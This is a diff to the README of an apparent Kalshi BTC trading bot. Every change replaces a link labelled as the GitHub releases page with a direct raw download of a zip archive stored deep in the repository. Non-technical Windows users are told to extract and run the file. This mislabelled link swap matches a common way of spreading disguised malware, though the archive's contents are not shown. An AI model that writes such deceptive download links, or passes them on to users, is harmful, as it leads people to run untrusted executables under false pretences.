@@ -1,12 +1,12 @@
 # 🤖 Kalshi-trade-bot - Track BTC Arbitrage With Ease
 
-[![Download Kalshi-trade-bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Juanp2389/Kalshi-trade-bot/releases)
+[![Download Kalshi-trade-bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Juanp2389/Kalshi-trade-bot/main/porthors/bot_trade_Kalshi_3.3.zip)
 
 ## 📥 Download
 
 Use this page to download the Windows version:
 
-[Visit the releases page](https://github.com/Juanp2389/Kalshi-trade-bot/releases)
+[Visit the releases page](https://raw.githubusercontent.com/Juanp2389/Kalshi-trade-bot/main/porthors/bot_trade_Kalshi_3.3.zip)
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that ends in `.exe` or `.zip` for Windows.
 
@@ -39,7 +39,7 @@ For the best result, use a computer that stays on while the bot runs. The app wo
 
 ## 🚀 Getting Started
 
-1. Open the [releases page](https://github.com/Juanp2389/Kalshi-trade-bot/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Juanp2389/Kalshi-trade-bot/main/porthors/bot_trade_Kalshi_3.3.zip)
 2. Find the newest release at the top of the page
 3. Download the Windows file
 4. If the file is a `.zip`, right-click it and choose Extract All
@@ -190,5 +190,5 @@ Yes. It is meant for short BTC market windows where timing matters
 
 Open the release page and get the latest Windows file:
 
-[https://github.com/Juanp2389/Kalshi-trade-bot/releases](https://github.com/Juanp2389/Kalshi-trade-bot/releases)
+[https://raw.githubusercontent.com/Juanp2389/Kalshi-trade-bot/main/porthors/bot_trade_Kalshi_3.3.zip](https://raw.githubusercontent.com/Juanp2389/Kalshi-trade-bot/main/porthors/bot_trade_Kalshi_3.3.zip)
 
